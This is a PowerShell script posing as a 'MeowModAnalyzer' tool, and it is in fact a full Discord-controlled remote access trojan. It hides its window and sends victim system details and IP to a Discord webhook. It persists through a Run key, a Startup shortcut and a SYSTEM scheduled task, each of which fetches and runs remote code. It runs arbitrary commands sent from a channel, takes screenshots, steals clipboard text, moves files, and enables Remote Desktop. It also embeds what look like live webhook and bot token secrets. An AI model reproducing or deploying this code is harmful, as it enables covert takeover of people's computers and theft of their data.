$webhook="https://discord.com/api/webhooks/1512766627438133309/Ei7ZQANDz4QPN6W0BTFp3oEs6O1SCa4XvMX0XS8Yr42MiEuQXsWE1yQQutuYTuCteEuI"
$token="MTUxMjkxNzg2NTY0MzM3NjY2MA.Gd-iOn.qZxolXW_9yxxUcVU7oONt5QDM2rmtYVo1L0TuQ"
$channel="1512918078189731890"

try{Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();'}[C.W]::ShowWindow([C.W]::GetConsoleWindow(),0)|Out-Null

function ds($c,$f,$e){$b=@{content=$c;username="MeowModAnalyzer"};if($e){$b.embeds=@($e|ConvertFrom-Json)};if($f-and(Test-Path $f)){try{$u="$webhook?wait=true";$j=$b|ConvertTo-Json -Depth10 -Compress;Add-Type -AssemblyName System.Net.Http;$cl=New-Object System.Net.Http.HttpClient;$ct=New-Object System.Net.Http.MultipartFormDataContent;$jc=New-Object System.Net.Http.StringContent $j;$ct.Add($jc,"payload_json");$fs=New-Object System.IO.FileStream($f,[System.IO.FileMode]::Open);$fc=New-Object System.Net.Http.StreamContent $fs;$ct.Add($fc,"file",[System.IO.Path]::GetFileName($f));$cl.PostAsync($u,$ct).Result|Out-Null;$cl.Dispose();$fs.Close();return}catch{}}try{Invoke-RestMethod -Uri $webhook -Method Post -Body($b|ConvertTo-Json -Depth10)-ContentType "application/json" -ErrorAction SilentlyContinue|Out-Null}catch{}}

function si{$p=$env:COMPUTERNAME;$u=$env:USERNAME;try{$o=(Get-CimInstance Win32_OperatingSystem).Caption}catch{$o="?"};try{$i=(Invoke-RestMethod "https://api.ipify.org" -ErrorAction SilentlyContinue)}catch{$i="?"};try{$c=(Get-CimInstance Win32_Processor).Name}catch{$c="?"};try{$r="{0:N2}GB"-f((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB)}catch{$r="?"};$e=@{title="New Connection - $p";color=3066993;fields=@{name="PC";value=$p;inline=$true},@{name="User";value=$u;inline=$true},@{name="OS";value="$o";inline=$false},@{name="IP";value=$i;inline=$true},@{name="CPU";value="$c";inline=$false},@{name="RAM";value=$r;inline=$true};footer=@{text="v2.0"};timestamp=(Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")};ds -c "@everyone New victim!" -e ($e|ConvertTo-Json)}

function ss($p){try{Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$s=[System.Windows.Forms.Screen]::PrimaryScreen;$b=$s.Bounds;$bm=New-Object System.Drawing.Bitmap $b.Width,$b.Height;$g=[System.Drawing.Graphics]::FromImage($bm);$g.CopyFromScreen($b.X,$b.Y,0,0,$b.Size);$g.Dispose();$bm.Save($p,[System.Drawing.Imaging.ImageFormat]::Png);$bm.Dispose();return$true}catch{return$false}}

function ec($c){$t=[System.IO.Path]::GetTempFileName()+".txt";try{$r=Invoke-Expression $c 2>&1|Out-String;if([string]::IsNullOrEmpty($r)){$r="[OK]"};if($r.Length-gt1900){$r|Out-File $t -Encoding UTF8;ds -c "Output:" -f $t;Remove-Item $t -Force -ErrorAction SilentlyContinue}else{ds -c "> $c`n$r"}}catch{ds -c "Error: $($_.Exception.Message)"}}

function ep{try{Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "MeowModUpdater" "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonynohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`"" -ErrorAction SilentlyContinue}catch{};try{$s=[Environment]::GetFolderPath("Startup");$sh=(New-Object -ComObject WScript.Shell).CreateShortcut("$s\MeowModUpdater.lnk");$sh.TargetPath="powershell.exe";$sh.Arguments="-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonynohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`"";$sh.WindowStyle=7;$sh.Save()}catch{};try{$a=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonynohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`"";$t=New-ScheduledTaskTrigger -AtStartup;$p=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest;Register-ScheduledTask "MeowModUpdaterTask" -Action $a -Trigger $t -Principal $p -Force -ErrorAction SilentlyContinue}catch{}}

function rdp{try{Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server" "fDenyTSConnections" 0 -ErrorAction SilentlyContinue;Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue;ds "RDP enabled on 3389"}catch{ds "RDP failed: $($_.Exception.Message)"}}

function pc($c,$a){switch -Wildcard ($c.ToLower()){"!help"{ds "Commands: !screenshot !cmd !shell !download !upload !persist !rdp !info !exit !ipconfig !pslist !prockill !lock !msg !clipboard"}
"!screenshot"{$p="$env:TEMP\ss_$(Get-Random).png";if(ss $p){ds "Screenshot" -f $p;Remove-Item $p -Force -ErrorAction SilentlyContinue}else{ds "SS failed"}}
"!cmd"{if($a){ec $a}else{ds "Usage: !cmd <cmd>"}}
"!shell"{if($a){ec "cmd /c $a"}else{ds "Usage: !shell <cmd>"}}
"!download"{if($a){$f=[System.IO.Path]::GetFileName($a);$d="$env:TEMP\$f";try{Invoke-WebRequest $a -OutFile $d -ErrorAction Stop;ds "DL: $f to $d"}catch{ds "DL failed: $($_.Exception.Message)"}}else{ds "Usage: !download <url>"}}
"!upload"{if($a-and(Test-Path $a)){ds "File: $a" -f $a}else{ds "Usage: !upload <path>"}}
"!persist"{ep;ds "Persistence ON"}
"!rdp"{rdp}
"!info"{try{$p=$env:COMPUTERNAME;$u=$env:USERNAME;$o=(Get-CimInstance Win32_OperatingSystem).Caption;$i=(Invoke-RestMethod "https://api.ipify.org" -ErrorAction SilentlyContinue);$c=(Get-CimInstance Win32_Processor).Name;$r="{0:N2}GB"-f((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB)}catch{};$e=@{title="Info - $p";color=3447003;fields=@{name="PC";value=$p;inline=$true},@{name="User";value=$u;inline=$true},@{name="OS";value="$o";inline=$false},@{name="IP";value=$i;inline=$true},@{name="CPU";value="$c";inline=$false},@{name="RAM";value=$r;inline=$true};timestamp=(Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")};ds "Info" -e ($e|ConvertTo-Json)}
"!exit"{ds "Bye!";exit}
"!ipconfig"{ec "ipconfig /all"}
"!pslist"{ec "Get-Process | Format-Table Id, ProcessName, CPU, PM -AutoSize"}
"!prockill"{if($a-and$a-match'^\d+$'){try{Stop-Process -Id $a -Force;ds "Killed PID: $a"}catch{ds "Kill failed: $($_.Exception.Message)"}}else{ds "Usage: !prockill <pid>"}}
"!lock"{try{Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.Application]::SetSuspendState([System.Windows.Forms.PowerState]::Lock,$false,$false)}catch{rundll32.exe user32.dll,LockWorkStation};ds "Locked"}
"!msg"{if($a){try{Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show($a,"MeowModAnalyzer","OK","Information")|Out-Null;ds "Msg: $a"}catch{ds "Msg failed"}}else{ds "Usage: !msg <text>"}}
"!clipboard"{try{Add-Type -AssemblyName System.Windows.Forms;$c=[System.Windows.Forms.Clipboard]::GetText();if($c){ds "Clip: $c"}else{ds "Clip empty"}}catch{ds "Clip failed"}}
default{ds "Unknown: $c. Use !help"}}}

si;ep;ds "Ready! Listening..."
$lastId=$null
while($true){
try{$msgs=Invoke-RestMethod "https://discord.com/api/v9/channels/$channel/messages?limit=5" -Headers @{"Authorization"="Bot $token";"User-Agent"="Mozilla/5.0"} -ErrorAction SilentlyContinue;if($msgs){foreach($m in $msgs){if($lastId-eq$null-or$m.id-gt$lastId){if(!$m.author.bot-and$m.content-match'^!'){$parts=$m.content-split' ',2;$c=$parts[0];$a=if($parts.Count-gt1){$parts[1]}else{""};pc $c $a};if($lastId-eq$null-or$m.id-gt$lastId){$lastId=$m.id}}}}}catch{};Start-Sleep 3}
